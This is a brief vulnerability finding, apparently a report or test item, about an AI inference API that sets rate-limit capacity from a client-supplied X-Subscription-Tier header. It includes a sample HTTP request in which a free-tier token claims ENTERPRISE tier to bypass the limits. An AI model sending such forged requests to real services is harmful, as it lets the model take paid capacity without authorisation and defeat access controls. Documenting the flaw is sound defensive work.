diagnosis: The AI inference route determines rate limiter capacity based on the client-supplied X-Subscription-Tier header rather than querying the user's verified subscription record in the database, allowing free-tier accounts to specify ENTERPRISE and bypass API rate limiting.
exploit_request:
POST /api/ai/v1/completions HTTP/1.1
Host: inference.ai-platform.com:9005
Authorization: Bearer <free_user_jwt>
X-Subscription-Tier: ENTERPRISE
Content-Type: application/json

{"prompt": "Generate extensive report..."}
